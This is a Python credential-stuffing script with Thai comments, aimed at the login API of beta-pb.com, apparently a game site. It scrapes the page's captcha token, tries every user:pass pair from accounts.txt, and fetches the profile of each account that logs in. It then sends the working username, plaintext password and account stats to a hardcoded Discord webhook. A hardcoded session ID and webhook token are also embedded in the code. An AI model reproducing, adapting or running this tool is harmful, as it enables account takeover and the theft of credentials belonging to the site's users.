import requests
import time
import json
import re
from bs4 import BeautifulSoup

# ================== 🔥 ตั้งค่า ==================
SESSION_ID = "d9c5d8c81b3012339001b6ffea85abcdaeeb10806a7891568086c70cb854084"
WEBHOOK_URL = "https://discord.com/api/webhooks/1525469193485684746/5Efh2B05L2zLhRqJt_JXi5UbkEsdFPLxKZiV-12XswSRAho26eiKjPYkQh7R6_xLNAyb"  # 👈 เปลี่ยนเป็นของคุณ

def get_captcha_token():
    """ดึง captcha_token จากหน้าเว็บ โดยไม่ต้องใช้ Selenium"""
    url = "https://beta-pb.com/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code != 200:
            print(f"   ⚠️ โหลดหน้าเว็บไม่ได้ (HTTP {resp.status_code})")
            return None
        
        html = resp.text
        
        # วิธีที่ 1: หาใน <input name="captcha_token">
        soup = BeautifulSoup(html, 'html.parser')
        inp = soup.find('input', {'name': 'captcha_token'})
        if inp and inp.get('value'):
            return inp['value']
        
        # วิธีที่ 2: หาด้วย regex ใน script หรือ attribute
        match = re.search(r'captcha_token["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
        if match:
            return match.group(1)
        
        # วิธีที่ 3: หาใน data attribute
        match = re.search(r'data-captcha-token=["\']([^"\']+)["\']', html)
        if match:
            return match.group(1)
        
        print("   ❌ ไม่พบ captcha_token ในหน้าเว็บ")
        return None
        
    except Exception as e:
        print(f"   ⚠️ get_captcha_token error: {e}")
        return None

def login(username, password, session, captcha_token):
    """ส่ง Login request พร้อม captcha_token"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "x-api-csrf-test": "1",
        "Referer": "https://beta-pb.com/",
        "Origin": "https://beta-pb.com",
        "X-Requested-With": "XMLHttpRequest"
    }
    payload = {
        "username": username,
        "password": password,
        "remember_me": False,
        "captcha_token": captcha_token or "",
        "language": "th"
    }
    return session.post("https://beta-pb.com/api/session/login", json=payload, headers=headers)

def get_profile(session):
    """ดึงโปรไฟล์หลังจาก Login สำเร็จ"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Referer": "https://beta-pb.com/dashboard",
    }
    resp = session.get("https://beta-pb.com/api/Player/GetPlayerOverview", headers=headers)
    if resp.status_code == 200:
        return resp.json()
    return None

def send_embed(username, password, profile):
    """ส่ง Embed ไป Discord"""
    name = profile.get('nickname') or profile.get('username') or profile.get('name') or username
    rank = profile.get('rank') or profile.get('level') or profile.get('role') or 'ไม่พบ'
    rank_id = profile.get('rankId') or ''
    
    embed = {
        "title": "✅ พบบัญชีที่ใช้งานได้",
        "color": 3066993,
        "fields": [
            {"name": "👤 ชื่อผู้ใช้", "value": name, "inline": True},
            {"name": "🔑 รหัสผ่าน", "value": password, "inline": True},
            {"name": "🎖️ ยศ", "value": rank, "inline": True}
        ],
        "footer": {"text": "ระบบตรวจสอบบัญชี"}
    }
    if rank_id:
        embed["thumbnail"] = {"url": f"https://media.beta-pb.com/ranks/{rank_id}.png"}
    
    for key, label in [('exp','💰 EXP'), ('kd','⚔️ K/D'), ('winRate','🏆 อัตราชนะ'), ('money','💵 เงิน'), ('mvp','⭐ MVP')]:
        val = profile.get(key)
        if val:
            embed["fields"].append({"name": label, "value": str(val), "inline": True})
    
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
        print(f"   📨 ส่ง Embed สำเร็จ: {name}")
    except Exception as e:
        print(f"   ❌ Discord Error: {e}")

def main():
    print("🚀 เริ่มตรวจสอบบัญชี beta-pb.com...")
    print(f"🔗 Webhook: {WEBHOOK_URL[:50]}...")
    
    # 1. ดึง captcha_token จากหน้าเว็บ
    print("🔍 กำลังดึง captcha_token จากหน้าเว็บ...")
    captcha_token = get_captcha_token()
    if not captcha_token:
        print("❌ ไม่สามารถดึง captcha_token ได้")
        print("💡 กำลังลองใช้ token ปลอม (อาจใช้ไม่ได้)...")
        captcha_token = "fake_token_for_test"
    
    print(f"✅ ได้ token: {captcha_token[:80]}...")
    
    # 2. อ่านไฟล์ accounts.txt
    try:
        with open("accounts.txt", "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip() and ":" in l]
    except FileNotFoundError:
        print("❌ ไม่พบไฟล์ accounts.txt")
        print("💡 สร้างไฟล์ accounts.txt แล้วใส่ user:pass ทีละบรรทัด")
        return
    
    if not lines:
        print("❌ ไม่มีบัญชีใน accounts.txt")
        return
    
    # 3. สร้าง session หลัก (ใช้ SESSION_ID ที่มี)
    main_session = requests.Session()
    main_session.cookies.set("session_id", SESSION_ID, domain="beta-pb.com")
    
    total = len(lines)
    success_count = 0
    
    # 4. วนลูปตรวจสอบบัญชี
    for idx, line in enumerate(lines, 1):
        try:
            username, password = line.split(":", 1)
        except ValueError:
            print(f"\n[{idx}/{total}] ❌ รูปแบบไม่ถูกต้อง: {line}")
            continue
            
        print(f"\n[{idx}/{total}] ทดสอบ: {username}")
        
        resp = login(username, password, main_session, captcha_token)
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                if 'error_code' not in data and 'error' not in data and data.get('success') != False:
                    print(f"   ✅ เข้าได้!")
                    profile = get_profile(main_session)
                    if profile:
                        send_embed(username, password, profile)
                        success_count += 1
                    else:
                        print("   ⚠️ ไม่สามารถดึงโปรไฟล์ได้")
                        send_embed(username, password, {"nickname": username})
                        success_count += 1
                else:
                    error_msg = data.get('error_code') or data.get('error') or 'Unknown'
                    print(f"   ❌ เข้าไม่ได้: {error_msg}")
            except json.JSONDecodeError:
                print(f"   ❌ Response ไม่ใช่ JSON: {resp.text[:100]}")
        else:
            print(f"   ❌ HTTP Error: {resp.status_code}")
        
        time.sleep(0.5)  # ป้องกัน rate limit
    
    print(f"\n🏁 เสร็จสิ้น! พบ {success_count} บัญชีที่ใช้งานได้ จากทั้งหมด {total}")

if __name__ == "__main__":
    main()
